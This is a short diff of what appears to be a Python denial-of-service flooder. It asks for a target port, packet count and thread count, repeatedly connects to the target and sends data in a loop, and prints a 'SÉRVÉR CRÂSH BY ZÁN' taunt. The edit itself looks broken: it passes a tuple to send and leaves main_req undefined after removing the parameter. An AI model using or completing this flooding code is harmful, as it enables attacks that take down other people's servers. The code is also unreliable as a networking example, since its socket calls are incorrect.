@@ -332,7 +332,7 @@ ip = socket.gethostbyname(ip)
 port = int(input("PORT >= "))
 pack = int(input("[ ? ] how long do you want Packet/s >="))
 th = int(input("[ ? ] how long do you want Thread/t >="))
-def randomip(main_req):
+def randomip():
   randip = [192, 168, 0, 1]
   randip1 = random.randint(3,255)
   randip2 = random.randint(3,255)
@@ -385,9 +385,9 @@ def stack():
        try:
          s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          s.connect((ip,port))
-         s.sendto((data,main_req))
+         s.send((data,main_req))
          for y in range(pack):
-          s.sendto(data)
+          s.send((data,main_req))
           print("SÉRVÉR {1} CRÂSH BY ZÁN")
        except:
           print("[+] server error")
